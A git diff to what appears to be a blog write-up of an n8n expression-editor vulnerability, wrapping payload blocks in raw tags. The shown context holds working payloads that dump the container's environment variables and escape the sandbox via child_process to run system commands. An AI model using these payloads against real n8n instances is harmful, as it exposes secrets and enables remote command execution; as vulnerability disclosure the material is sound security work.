@@ -54,11 +54,13 @@ Enter the following payloads into the expression editor to demonstrate the vulne
 This payload accesses `this.process.env` to leak sensitive environment variables from the container.
 
 **Payload:**
+{% raw %}
 ```javascript
 {{ (function() {
   return JSON.stringify(this.process.env, null, 2);
 })() }}
 ```
+{% endraw %}
 
 **Result:**
 ![]({{ site.baseurl }}/assets/images/n8n-cve/payload_env.png)
@@ -67,6 +69,7 @@ This payload accesses `this.process.env` to leak sensitive environment variables
 This payload bypasses the sandbox by accessing `process.mainModule.require` to load the `child_process` module, allowing execution of arbitrary system commands.
 
 **Payload:**
+{% raw %}
 ```javascript
 {{ (function() {
   const require = this.process.mainModule.require;
@@ -74,6 +77,7 @@ This payload bypasses the sandbox by accessing `process.mainModule.require` to l
   return execSync('whoami').toString();
 })() }}
 ```
+{% endraw %}
 
 ![]({{ site.baseurl }}/assets/images/n8n-cve/payload_who_am_i.png)
 
@@ -84,6 +88,7 @@ Verifies the user context of the running process.
 Demonstrates the ability to browse the file system.
 
 **Payload:**
+{% raw %}
 ```javascript
 {{ (function() {
   const require = this.process.mainModule.require;
@@ -91,6 +96,7 @@ Demonstrates the ability to browse the file system.
   return execSync('ls -la /').toString();
 })() }}
 ```
+{% endraw %}
 
 **Result:**
 ![]({{ site.baseurl }}/assets/images/n8n-cve/payload_ls.png)
